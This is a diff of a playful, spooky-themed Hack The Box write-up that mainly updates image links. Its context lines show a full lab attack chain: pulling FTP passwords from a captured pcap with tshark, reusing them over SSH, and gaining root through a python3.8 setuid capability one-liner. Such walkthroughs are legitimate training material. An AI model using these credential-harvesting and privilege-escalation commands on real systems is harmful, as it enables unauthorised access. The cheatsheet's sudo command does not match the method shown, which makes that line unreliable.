@@ -8,7 +8,7 @@
 + Date: 2023-10-31 🕷️
 + Author: Lantern 🔥
 
-![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
+![OIP](https://github.com/user-attachments/assets/1919a0e6-e1ca-4109-8fa2-db198f4b5502)
 
  Haunted Flag Hunt
 👻 User Flag Séance (1/2)
@@ -21,13 +21,15 @@ curl http://10.10.10.245/data/0 -o haunted.pcap
 PCAP Ghost Whispering
 → Heard credentials whispering in the packets: Often times when a there is an ID/# we can run other ID's to see what we can find.
 
-![Alt text](Cap/1.png)
+![1](https://github.com/user-attachments/assets/0367eff8-ceec-47d8-9a88-80baf9d20c35)
+
 
 Step 2
 tshark -r haunted.pcap -Y "ftp contains 'PASS'" -Tfields -e ftp.request.arg
 → "The spirits say: User/Password 🎃
 
-![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
+![2](https://github.com/user-attachments/assets/d365dc96-c522-4917-b683-3e7f9820a72c)
+
 
 SSH Apparition
 → Materialized into Nathan's account: Use the previously discovered login credentials.
@@ -41,7 +43,6 @@ cat user.txt
 Capability Ghostbusting
 → Detected haunted Python binary:
 
-![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
 
 Step 1
 getcap -r / 2>/dev/null
@@ -49,13 +50,12 @@ getcap -r / 2>/dev/null
 Poltergeist Privileges
 → Exorcised root privileges:
 
-![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
+![5](https://github.com/user-attachments/assets/6bb5a5d4-fb76-4cf7-ab8b-2bb7e46857fd)
 
 Step 2
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 → "The power of root compels you!" 🎃
 
-![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
 
 Flag Finale
 → Banished root flag from /root:
@@ -63,11 +63,11 @@ Flag Finale
 Step 3
 cat /root/root.txt
 # HTB{r00t_fl46_p0ss3ss10n_c0mpl3t3} 👻🔥
-<img src="https://em-content.zobj.net/source/microsoft-teams/363/spider-web_1f578-fe0f.png" width="25"> Flag Locations Cheatsheet
+
 Flag Type	Location Spell	Incantation
 User	/home/nathan/user.txt	cat user.txt 🎃
 Root	/root/root.txt	sudo python3.8 -c 'import os; os.system("cat /root/root.txt")' 👻
-<p align="center"> <img src="https://media.giphy.com/media/12BYUePgtn7sis/giphy.gif" width="300"> <br> <em>"Two flags flew out of the haunted machine, user first and root between!"</em> </p>
+"Two flags flew out of the haunted machine, user first and root between!"</em> </p>
 🎃 Beginner's Cauldron (Flag Hunting Tips)
 User Flags usually hide in:
 
